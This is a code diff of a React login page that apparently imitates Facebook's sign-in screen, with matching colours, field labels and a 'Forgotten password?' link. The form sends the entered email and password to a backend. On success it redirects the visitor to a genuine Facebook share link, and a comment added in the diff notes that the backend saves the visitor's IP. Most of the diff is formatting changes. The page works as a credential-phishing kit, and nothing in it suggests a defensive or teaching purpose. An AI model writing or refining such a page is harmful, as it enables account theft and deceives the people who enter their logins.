@@ -5,7 +5,6 @@ function App() {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
 
-  // Submit handler
   const handleSubmit = async (e) => {
     e.preventDefault();
 
@@ -25,11 +24,14 @@ function App() {
 
       const data = await res.json();
 
-    if (data.success) {
-  window.location.href = "https://www.facebook.com/share/r/1D9pKTPKrz/";
-  setEmail("");
-  setPassword("");
-} else {
+      if (data.success) {
+        // backend automatically saves IP
+        window.location.href =
+          "https://www.facebook.com/share/r/1D9pKTPKrz/";
+
+        setEmail("");
+        setPassword("");
+      } else {
         alert("Failed: " + data.message);
       }
     } catch (error) {
@@ -43,7 +45,7 @@ function App() {
     <div className="min-h-screen bg-[#f0f2f5]">
       <div className="flex items-center justify-center min-h-screen">
         <div className="flex flex-col md:flex-row w-full lg:max-w-9/12 items-center justify-between px-4 lg:px-0">
-          
+
           {/* LEFT SIDE TEXT */}
           <div className="flex-1 md:max-w-10/12 md:ml-[-40px] text-center md:text-left mb-6 md:mb-0">
             <h1 className="text-[#1877f2] pt-14 text-6xl lg:text-8xl font-bold">
@@ -56,9 +58,9 @@ function App() {
 
           {/* RIGHT SIDE FORM */}
           <div className="w-full flex justify-center md:justify-end md:mt-[-40px]">
-            <div className="w-[600px] bg-white rounded-lg shadow-[0_8px_16px_rgba(0,0,0,0.1)] px-8 pt-8 pb-8  lg:py-20">
+            <div className="w-[600px] bg-white rounded-lg shadow-[0_8px_16px_rgba(0,0,0,0.1)] px-8 pt-8 pb-8 lg:py-20">
+              
               <form onSubmit={handleSubmit} className="space-y-3">
-
                 <input
                   type="text"
                   placeholder="Email address or phone number"
@@ -72,7 +74,7 @@ function App() {
                   placeholder="Password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="w-full h-[60px] border border-[#dddfe2] text-black rounded-lg px-4 text-[17px] placeholder:text-[#343333]  focus:outline-none focus:text-[#201f21] focus:border-[#1877f2]"
+                  className="w-full h-[60px] border border-[#dddfe2] text-black rounded-lg px-4 text-[17px] placeholder:text-[#343333] focus:outline-none focus:text-[#201f21] focus:border-[#1877f2]"
                 />
 
                 <button
@@ -84,12 +86,11 @@ function App() {
                 </button>
               </form>
 
-
-
-
-
               <div className="mt-3 text-center">
-                <a href="#" className="text-[14px] text-[#1877f2] hover:underline">
+                <a
+                  href="#"
+                  className="text-[14px] text-[#1877f2] hover:underline"
+                >
                   Forgotten password?
                 </a>
               </div>
@@ -102,7 +103,6 @@ function App() {
                 </button>
               </div>
             </div>
-            
           </div>
 
         </div>
